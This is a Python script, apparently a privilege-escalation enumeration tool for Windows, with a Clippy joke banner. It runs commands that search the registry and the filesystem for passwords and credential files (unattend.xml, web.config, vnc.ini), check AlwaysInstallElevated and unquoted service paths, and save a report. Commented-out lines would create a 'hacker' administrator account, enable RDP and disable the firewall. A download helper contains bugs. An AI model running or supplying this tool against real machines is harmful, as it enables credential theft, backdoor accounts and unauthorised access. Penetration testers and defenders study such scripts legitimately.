import subprocess
import urllib
import random
import datetime
import re
from pathlib import Path
import os

report = ""

def print_banner(title):
	banner = "==============================\n"
	banner += title
	banner += "\n==============================\n"
	global report
	report += banner
	print(banner)

def system_call(command):
	process = subprocess.Popen(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
	(stdout, stderr) = process.communicate()
	stdout = stdout.decode("utf-8")
	print(stdout)
	global report
	report += "\n" + stdout
	return stdout

def list_dir(path):
	dir_string = ""
	if path.exists():
		for currentFile in path.iterdir():  
			dir_string += str(currentFile) + "\n"
	print(dir_string)
	global report
	report += "\n" + dir_string

def determine_os_ver(ver_string):
	ver_string.splitlines()[1]
	#stub

greetings = [
"escalate privileges",
"hack the planet"
]

greeting = "I see you're trying to " + random.choice(greetings) + ", would you like some help with that?"
printstr = """\

< {0} >
	     __
	    /  \
	    |  |
	    @  @
	    |  |
	    || |/
	    || ||
	    |\_/|
	    \___/
                    """.format(greeting)

print(printstr) #Source https://textart.io/cowsay/clippy

def enum():
	print_banner("BASIC OS INFO")
	system_call('ver')
	determine_os_ver(system_call('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'))
	system_call('hostname')
	system_call('net config Workstation')

	print_banner("PATH")
	system_call('echo %path%')

	print_banner("USERS")
	system_call("echo %username%")
	system_call('net users')

	print_banner("GROUPS")
	system_call('net localgroup')

	print_banner("ADMIN USERS")
	system_call("net localgroup Administrators")

	print_banner("REGISTRY: Always Installed Elevated")
	system_call('reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated')
	system_call('reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated')

	print_banner("REGISTRY: Credentials Search")
	system_call('reg query HKLM /f password /t REG_SZ /s')
	system_call('reg query HKCU /f password /t REG_SZ /s')

	print_banner("TASKS")
	system_call('tasklist /v')

	print_banner("SCHEDULED TASKS")

	system_call('schtasks /query /fo LIST /v')

	print_banner("NETWORKING: Listening Ports")
	system_call("netstat -ano")

	print_banner("FIREWALL: Status")
	system_call("netsh firewall show state")

	print_banner("FIREWALL: Config")
	system_call("netsh firewall show config")

	print_banner("DRIVERS")
	system_call("DRIVERQUERY")

	print_banner("FILESYSTEM: Credentials Search")
	system_call("dir /s *pass* == *cred* == *vnc* == *.config*")
	# system_call("findstr /si password *.xml *.ini *.txt *.config")
	system_call("dir /b /s unattend.xml")
	system_call("dir /b /s web.config")
	system_call("dir /b /s sysprep.inf")
	system_call("dir /b /s sysprep.xml")
	system_call("dir /b /s vnc.ini")

	print_banner("PROGRAMS: Installed Programs")
	list_dir(Path(r'C:\Program Files'))
	list_dir(Path(r'C:\Program Files (x86)'))

	print_banner("PROGRAMS: Appdata")
	list_dir(Path(os.getenv('APPDATA')))
	list_dir(Path(os.getenv('LOCALAPPDATA')))

	print_banner("WMIC: Installed Patches")
	kbs = re.findall (r'\b[KB]\w+', system_call("wmic qfe get Caption,Description,HotFixID,InstalledOn"))
	print (kbs)

	print_banner("WMIC: Unquoted Service Paths")
	system_call('wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """"')

	print_banner("ACCESSCHK")
	if Path("accesschk.exe").exists():
		system_call('accesschk.exe -uwcqv "Authenticated Users" * /accepteula')
	else:
		print("accesschk.exe missing.")

#def kb_search
	#stub


def download(url):
	file = urllib2.urlopen(url)
	filename = url[url.rindex('/')+1:]
	with open('filename','wb') as output:
  		output.write(file.read())

def obvious_hax():
	print_banner("Creating a new admin user")
	# system_call("net user hacker hacker /add")
	# system_call("net localgroup administrators hacker /add")
	# system_call('net localgroup "Remote Desktop Users" hacker /add')
	# print_banner("Enabling RDP")
	# system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f')
	# system_call('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
	# system_call('net start TermService')
	# print_banner("Disabling Firewall")
	# system_call('NetSh Advfirewall set allprofiles state off')
	# system_call('netsh firewall set opmode disable')

enum()
time = str(datetime.datetime.now()).replace(":","_").replace(" ","_").replace(".","_")
text_file = open("clippy_report_" + time + ".txt", "w")
text_file.write(report)
text_file.close()